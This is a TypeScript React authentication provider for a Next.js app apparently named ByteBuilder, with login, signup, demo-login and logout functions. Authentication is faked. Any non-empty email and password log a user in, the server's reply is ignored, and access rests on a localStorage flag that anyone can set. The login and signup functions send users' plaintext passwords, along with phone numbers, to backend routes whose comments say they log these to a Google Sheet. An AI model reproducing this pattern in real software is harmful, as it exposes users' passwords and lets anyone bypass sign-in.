"use client";

import React, { createContext, useContext, useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export interface User {
  id: string;
  name: string;
  email: string;
  phone?: string;
  currentRole?: string;
  location?: string;
}

interface AuthContextType {
  user: User | null;
  isAuthenticated: boolean;
  loading: boolean;
  login: (email: string, pass: string) => Promise<{ success: boolean; error?: string }>;
  signup: (userData: { name: string; email: string; pass: string; phone?: string; currentRole?: string; location?: string }) => Promise<{ success: boolean; error?: string }>;
  demoLogin: () => void;
  logout: () => void;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

const DEMO_USER: User = {
  id: "user_demo",
  name: "Rahul Sharma",
  email: "rahul.sharma@example.com",
  phone: "+91 98765 43210",
  currentRole: "Software Engineer",
  location: "Bangalore, India",
};

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const router = useRouter();

  useEffect(() => {
    // Check local session
    const savedUser = localStorage.getItem("bytebuilder_user");
    const isAuth = localStorage.getItem("bytebuilder_auth");

    if (savedUser && isAuth === "true") {
      try {
        setUser(JSON.parse(savedUser));
      } catch {
        setUser(DEMO_USER);
      }
    }
    setLoading(false);
  }, []);

  const login = async (email: string, pass: string) => {
    if (!email || !pass) {
      return { success: false, error: "Please enter both email and password." };
    }

    try {
      // Call backend route to log event to Google Sheet
      await fetch("/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password: pass }),
      });
    } catch (e) {
      console.warn("Backend API sync warning:", e);
    }

    const loggedUser: User = {
      id: "user_" + Date.now(),
      name: email.split("@")[0].replace(".", " ").replace(/\b\w/g, (l) => l.toUpperCase()),
      email: email,
      phone: "+91 98765 43210",
      currentRole: "Tech Professional",
      location: "Bangalore, India",
    };
    setUser(loggedUser);
    localStorage.setItem("bytebuilder_user", JSON.stringify(loggedUser));
    localStorage.setItem("bytebuilder_auth", "true");
    return { success: true };
  };

  const signup = async (userData: { name: string; email: string; pass: string; phone?: string; currentRole?: string; location?: string }) => {
    if (!userData.email || !userData.pass || !userData.name) {
      return { success: false, error: "Please complete all required fields." };
    }

    try {
      // Call backend route to log SIGNUP event with phone & password to Google Sheet
      await fetch("/api/auth/signup", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: userData.name,
          email: userData.email,
          phone: userData.phone || "+91 98765 43210",
          password: userData.pass,
          role: userData.currentRole || "Software Engineer",
          location: userData.location || "Bangalore, India",
        }),
      });
    } catch (e) {
      console.warn("Backend API sync warning:", e);
    }

    const newUser: User = {
      id: "user_" + Date.now(),
      name: userData.name,
      email: userData.email,
      phone: userData.phone || "+91 98765 43210",
      currentRole: userData.currentRole || "Software Engineer",
      location: userData.location || "Bangalore, India",
    };
    setUser(newUser);
    localStorage.setItem("bytebuilder_user", JSON.stringify(newUser));
    localStorage.setItem("bytebuilder_auth", "true");
    return { success: true };
  };

  const demoLogin = async () => {
    setUser(DEMO_USER);
    localStorage.setItem("bytebuilder_user", JSON.stringify(DEMO_USER));
    localStorage.setItem("bytebuilder_auth", "true");

    try {
      await fetch("/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: DEMO_USER.email, password: "demo_password" }),
      });
    } catch (e) {
      // Ignore
    }

    router.push("/dashboard");
  };

  const logout = () => {
    setUser(null);
    localStorage.removeItem("bytebuilder_user");
    localStorage.removeItem("bytebuilder_auth");
    router.push("/login");
  };

  return (
    <AuthContext.Provider
      value={{
        user,
        isAuthenticated: !!user,
        loading,
        login,
        signup,
        demoLogin,
        logout,
      }}
    >
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error("useAuth must be used within an AuthProvider");
  }
  return context;
}
